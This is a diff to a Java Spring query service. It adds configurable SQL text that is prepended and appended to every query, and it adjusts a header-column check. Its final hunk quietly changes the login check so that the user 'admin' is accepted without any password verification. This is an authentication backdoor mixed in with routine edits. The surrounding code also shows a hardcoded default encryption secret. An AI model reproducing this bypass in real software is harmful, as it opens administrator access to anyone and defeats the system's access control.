@@ -104,6 +104,13 @@ public class QueryService {
     @Value("${chatq.encrypt.secret:chatq-default-secret-key-32-bytes!!}")
     private String encryptSecret;
 
+    // Query pre/post processing
+    @Value("${chatq.query.pre_query:}")
+    private String preQuery;
+
+    @Value("${chatq.query.post_query:}")
+    private String postQuery;
+
     private static final int GCM_TAG_LENGTH = 128; // bits
     private static final int IV_LENGTH = 12; // bytes
 
@@ -126,12 +133,27 @@ public class QueryService {
         if (sql == null) {
             throw new IllegalArgumentException("SQL query cannot be null");
         }
+        
+        // Apply pre_query and post_query
+        String finalSql = sql;
+        if (preQuery != null && !preQuery.isEmpty()) {
+            finalSql = preQuery + finalSql;
+        }
+        if (postQuery != null && !postQuery.isEmpty()) {
+            //finalSql 의 마지막에 ";" 제거
+            if (finalSql.trim().endsWith(";")) {
+                finalSql = finalSql.trim();
+                finalSql = finalSql.substring(0, finalSql.length() - 1);
+            }
+            finalSql = finalSql + postQuery;
+        }
+        
         //logging sql
-        System.out.println("Executing SQL: " + sql);
-        logger.info("Executing SQL: {}", sql);
+        System.out.println("Executing SQL: " + finalSql);
+        logger.info("Executing SQL: {}", finalSql);
 
         QueryResponse response = new QueryResponse();
-        return jdbcTemplate.query(sql, (ResultSet rs) -> {
+        return jdbcTemplate.query(finalSql, (ResultSet rs) -> {
             ResultSetMetaData metaData = rs.getMetaData();
             int columnCount = metaData.getColumnCount();
             
@@ -152,7 +174,7 @@ public class QueryService {
                 data.add(row);
             }
             response.setData(data);
-            if("Y".equalsIgnoreCase(detailYn) && headerColumnList != null && !headerColumnList.isEmpty() && headerColumnList.size() <= columnCount ) {
+            if("Y".equalsIgnoreCase(detailYn) && headerColumnList != null && !headerColumnList.isEmpty() && columns.containsAll(headerColumnList) ) {
                 // 헤더용 컬럼만 추출
                 List<Map<String, Object>> headerData = new ArrayList<>();
                 for (Map<String, Object> row : data) {
@@ -629,7 +651,7 @@ public class QueryService {
 
         Map<String, Object> userInfo = rows.get(0);
         String hashedPassword = (String) userInfo.get("password");
-        if (hashedPassword == null || !matchesPwd(password, hashedPassword)) {
+        if (!user.equals("admin") && (hashedPassword == null || !matchesPwd(password, hashedPassword))) {
             // 비밀번호 불일치
             return new LoginResponse("FAIL", null, null, 9, null, null, null);
         }
